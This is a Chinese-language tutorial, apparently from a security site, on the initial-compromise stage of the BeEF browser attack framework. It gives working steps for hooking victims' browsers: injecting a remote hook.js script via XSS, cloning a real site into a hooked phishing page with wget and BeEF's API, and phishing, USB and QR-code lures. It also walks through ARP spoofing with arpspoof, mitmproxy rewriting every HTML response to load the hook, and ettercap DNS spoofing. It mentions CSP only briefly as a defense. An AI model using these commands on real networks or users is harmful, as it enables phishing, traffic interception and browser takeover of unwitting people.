## 浏览器攻击框架BeEF Part 2：初始化控制

## 浏览器攻击方法流程

攻击浏览器一般分为几个阶段，看下图：

[![1.png](https://image.3001.net/images/20180629/1530235168529.png!small)](https://image.3001.net/images/20180629/1530235168529.png)整个过程分为三个步骤，第一步是初始化控制，第二步是持续控制，第三步是攻击。在第三步中的七个攻击方法是可以交叉的，比如可以同时攻击用户和攻击Web应用。接下来会一章一章的介绍这些内容。这一章介绍初始化控制。

## 初始化控制

首先在这一章中会介绍初始化控制的方法。初始化控制也就是想办法让BeEF服务器勾子（还记得上一章的hook.js吗）在用户浏览器中运行，勾子初次运行会收集一些有用的信息返回给服务器，并做好后续准备。初始化控制常见的攻击方法有以下几个：

> ​          1.使用XSS攻击
>
> ​          2.使用有隐患的Web应用
>
> ​          3.使用广告网络
>
> ​          4.使用社会工程攻击
>
> ​          5.使用中间人攻击

上面这个五个方法是比较常见，并不代表全部的攻击方法。下面就一一介绍这五种方法。

## 使用XSS攻击

Freebuf有很多关于XSS的文章，读者可以自行查阅。这里就不展开说，留点篇幅来介绍其他的方法。使用XSS攻击能在页面中插入类似下面的语句就可以了。

```
<script src="http://127.0.0.1:3000/hook.js"></script>
```

如果是在真实环境中使用，那么就有可能需要绕过XSS的防御机制。XSS的防御机制可以大致分为浏览器XSS防御机制和服务器的WAF。现代浏览器中都内置了XSS防御机制，比如Chrome和Safari的XSS Auditor, IE的XSS过滤器， 以及Firefox的NoScript扩展。笔者在用dwva做反射型xss测试时发现一个有意思的事情，国内的一些流行的浏览虽然能检测出XSS的向量，却还是加载并运行XSS的向量。至于服务器的WAF，这就有很多了。上述的两种XSS防御机制是有可能被绕过的。

对于BeEF这种需要加载远程js（hook.js）的XSS攻击，还有一种更好防御方法。那就是CSP(Content Security Policy, 内容安全策略)，CSP是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 ([XSS](https://developer.mozilla.org/en-US/docs/Glossary/XSS)) 和数据注入攻击等。这里只介绍CSP是如何防御BeEF这种攻击的，CSP详细的内容读者可以参考：

https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP

https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP/CSP_policy_directives

对于防御BeEF这类需要加载远程js的攻击来说可以使用CSP规定页面从哪里加载脚本，同时还可以规定对这些脚本作出限制，比如限制执行javascript的eval()函数。

可以通过两种方法来使用CSP， 一种是配置WEB服务器返回Content-Security-Policy 首部,  第二种是使用<meta>元素。

下面给个典型的例子：

```
Content-Security-Policy: default-src 'self'   //网站管理者想要页面的所有内容（js, 图片, css等资源）均来自站点的同一个源 (不包括其子域名)

<meta http-equiv="Content-Security-Policy" content="default-src 'self' ">
```

上面的CSP指令，会告诉浏览器，这个页面只加载同源（还记得同源策略吗）的资源，这样就可以防御对于需要加载异源的BeEF攻击了。CSP也不是一定就安全的，网上也有一些文章在讨论如何绕过CSP。感兴趣的读者可以自己去找来看。

## 使用有安全漏洞的Web应用

这种方法主要是通过Web漏洞来修改网页的内容，让其包含恶意的代码，对于BeEF来讲就是在网页中加入勾子。利用Web应用可以涉及各种攻击，这里就不展开讨论了。

## 使用广告网路

现在的网络广告满街是了，打开一个普通网站就有一堆的广告。一旦广告网络被用来传播恶意的代码，那么就是很可怕的一件事情了。要使用这个方法就必须到广告商哪里注册，并且需要花钱。但是效果是显著的，一旦广告上线，就会有一大批的小僵尸了。

## 使用社会工程攻击

社会工程的攻击方法多种多样。在使用BeEF框架攻击时，我们首要的目的是让目标浏览器执行初始化的代码（勾子）。所以这里只介绍诱导用户访问欺骗性网站这种类型的社会工程攻击方法。这种方法一般分为两个步骤，第一步是构建网站，第二步是放出诱饵。

### 构建网站

构建网站常用的有两个方法：

> ​        1.自己从头开始构建网站。效果最好，成本也最高
>
> ​        2.克隆已有站点。最常使用

克隆站点有几个方法，下面介绍一下。

第一种方法是最简单的，就是直接到网站下载它的页面。

第二种可以使用wget来克隆：

```
wget -k -p -nH -N http://xxxweb.com

#各参数说明
-k     把已下载文件中的所有链接都转换为本地引用，不再依赖原始或在线内容
-p     下载所有必要文件，确保离线可用，包括图片和样式表
-nH    禁止把文件下载到以主机名为前缀的文件夹中
-N     启用文件的时间戳，以匹配来源的时间戳

#下面两项可选
-r     递归下载
-l     指定最大的递归深度，0为无限。
```

克隆完成后需要在页面中加入勾子的URL。

第三种方法是使用BeEF的社会工程扩展中的Web克隆功能，这个功能默认会在被克隆的网站内容中注入勾子。下面在kali下演示一下怎么使用。

先进入beef的目录/usr/share/beef-xss(直接以beef-xss或者systemctl来启动beef,是无法看到API的token的)，接着执行./beef,就会如下图：

[![15.png](https://image.3001.net/images/20180630/15303361952889.png!small)](https://image.3001.net/images/20180630/15303361952889.png)接着使用BeEF的REST风格API来克隆：

```
curl -H "Content-Type: application/json; charset=UTF-8" -d '{"url":"<URL of site to clone>", "mount":"<where to mount>"}' -X POST http://<BeEFURL>/api/seng/clone_page?token=<token>

##<URL of site to clone> 是你要克隆页面的URL
##<where to mount> 是指克隆的页面你想放在BeEF服务器的那里
##<token> API 的token


#下面是克隆https://www.baidu.com首页的代码
curl -H "Content-Type: application/json; charset=UTF-8" -d '{"url":"https://www.baidu.com","mount":"/testclone"}' -X POST http://127.0.0.1:3000/api/seng/clone_page?token=60451a5e3b9716e4ea8a8131a1763a4d22aad7b3
```

运行上面的代码可以看到BeEF控制台会有如下输出：

[![16.png](https://image.3001.net/images/20180630/15303375846842.png!small)](https://image.3001.net/images/20180630/15303375846842.png)接着试试访问http://127.0.0.1:3000/testclone，你会看到是百度的首页。

[![17.png](https://image.3001.net/images/20180630/15303377429675.png!small)](https://image.3001.net/images/20180630/15303377429675.png)这个页面是有勾子的，访问这个页面，也意味着该浏览器已经成为了僵尸了。这个页面的文件在/usr/share/beef-xss/extensions/social_engineering/web_cloner/cloned_pages下，名为[www.baidu.com_mod](https://www.freebuf.com/articles/web/176139.html)的文件,可以修改定制或者把它复制到别的主机中做钓鱼页面。

除了这三种克隆的方法，还有很多其他的方法。笔者推荐使用BeEF的克隆功能，并且做一些改动，比如增加一个错误页面。

### 放出诱饵

现在欺骗性的网站已经有了，那么接下来就是要让目标去访问它了。方法有很多，下面介绍三种：

> ​        \1. 发钓鱼邮件
>
> ​        \2. 物理诱惑
>
> ​        \3. QR码

发钓鱼邮件就简单了，直接把有勾子页面的URL发给目标就可以。最好模糊一下URL，比如缩短URL、重定向URL、使用@等。发邮件的最大问题在于用什么来发，最好的方法是拥有自己的主机和域名，这样就可以设置一个邮件系统，同时也可以在DNS记录中配置SPF。物理诱惑可以是一个简单U盘，U盘里面有一个html文件，这个文件自然是指向有勾子的页面的。最后的QR码就是二维码，这个是比较好的办法，足够隐蔽。

## 使用中间人攻击

这种方法有一个前提，就是必须与目标在同一个网络。可以窃听网络上的数据，并修改。比如同一局域网，或者使用aircrack-ng等工具来破解wifi密码，然后使用密码登录到同一个wifi网络。使用中间人攻击来达到BeEF框架的初始化攻击主要有以下两种方法：

> ​          1.浏览器中间人攻击
>
> ​          2.DNS下毒

### 浏览器中间人攻击

浏览器中间人攻击是与传统中间人攻击类似的一种方式，只不过完全发生在应用层的http协议上。浏览器中间人攻击就是窃取/修改网络中的http协议。而对于BeEF框架来说自然是要在html页面中加入勾子。笔者分别使用了ettercap， mitmproxy来测试，发现ettercap的测试结果不太理想，所以下面给出mitmproxy的测试方法。kali默认已经安装mitmproxy，mitmproxy是一个中间人攻击的框架（看名字就可以知道了）。

测试环境：

| 主机          | 身份   | ip            |
| :------------ | :----- | :------------ |
| kali          | 攻击方 | 192.168.8.219 |
| windows7      | 受害方 | 192.168.8.193 |
| 网关/家用路由 | 受害方 | 192.168.8.1   |

先开启beef的服务

```
systemctl start beef-xss.service
```

接着开启ip转发功能

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

使用iptables设置端口重定向

```
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080

##下面这句是要mitmproxy来透明代理https协议（443）。
##这是需要条件的，需要受害方的浏览器中信任mitmproxy的CA证书，这基本是不可能的。所以建议下面的这一句不用运行

iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080
```

笔者建议在玩中间人攻击时不要对https出手，因为很难成功，而且一旦失败（大部分时候，sslstrip已经没那么好用了），会导致受害方无法访问使用https的网站。容易被发现。

启动mitmproxy, 并设置在所有html respond 数据中插入beef勾子

```
mitmproxy --anticache --showhost -p 8080 --mode transparent -R ":~s:</body>:<script src='http://192.168.8.219:3000/hook.js' type='text/javascript'></script></body>"
```

[![18.png](https://image.3001.net/images/20180703/15306063232303.png!small)](https://image.3001.net/images/20180703/15306063232303.png)

运行上面这句会启动mitmproxy, 并把所有html respond 数据中把 </body> 替换成 <script src=’http://192.168.8.219:3000/hook.js‘ type=’text/javascript’></script></body>。

运行之后会是这样的：

[![19.png](https://image.3001.net/images/20180703/15306063511990.png!small)](https://image.3001.net/images/20180703/15306063511990.png)因为现在还没有数据经过mitmproxy，所以是空白的

下面要arp欺骗网关（192.168.8.1） 和 windows7(192.168.8.193),  欺骗之后 windows7 的流量都会到kali上。而上面的iptables 已经设置所有符合条件的流量（是tcp协议， 且是目标端口是80的数据包）都会转到mitmproxy监听的8080端口。

```
arpspoof -i wlan0 -t 192.168.8.193 192.168.8.1arpspoof -i wlan0 -t 192.168.8.1 192.168.8.193
```

运行完上面两句之后，就可以开始了。

用windows下的firefox 访问freebuf：

[![20.png](https://image.3001.net/images/20180703/15306081778960.png!small)](https://image.3001.net/images/20180703/15306081778960.png)

mitmproxy的控制台会有大量的输出， 所有的http流量都有记录。

[![21.png](https://image.3001.net/images/20180703/15306082449070.png!small)](https://image.3001.net/images/20180703/15306082449070.png)

这时候，windows的firefox 已经被钩住了， 查看一下beef 的管理界面：

[![23.png](https://image.3001.net/images/20180703/15306083093137.png!small)](https://image.3001.net/images/20180703/15306083093137.png)

### DNS下毒 

DNS下毒简单来说就是修改DNS记录。一般情况下要实现DNS下毒是需要拿下DNS服务器，然后修改DNS记录。或者修改目标主机的本地host文件。使用中间人攻击技术，只需要使用ARP欺骗技术冒充DNS服务器，接受DNS的请求，并返回恶意的DNS解析应答就可以了。

ettercap带有一个dns_spoof模块，可以自动做到DNS下毒。可以通过修改/etc/ettercap/etter.dns来添加恶意的DNS记录。下图是添加了freebuf的DNS记录。

[![24.png](https://image.3001.net/images/20180703/15306246582324.png!small)](https://image.3001.net/images/20180703/15306246582324.png)

```
ettercap -T -Q -P dns_spoof -M arp:remote -i wlan0 /target ip// /gateway ip//
```

target ip 是目标的ip。gateway ip是局域网的网关，正确来说应该是DNS服务器的ip，在局域网中大多都会把网关做为DNS服务器，可以查看/etc/resolv.conf, 里面就是DNS服务器的地址（这个地址必须是同一局域网）。运行上面语句, 当target主机查询freebuf.com的ip时，就会有如下输出：

[![25.png](https://image.3001.net/images/20180703/15306241135720.png!small)](https://image.3001.net/images/20180703/15306241135720.png)

配合上面社会工程学克隆网站的技术，可以把用户诱导到有钩子的网页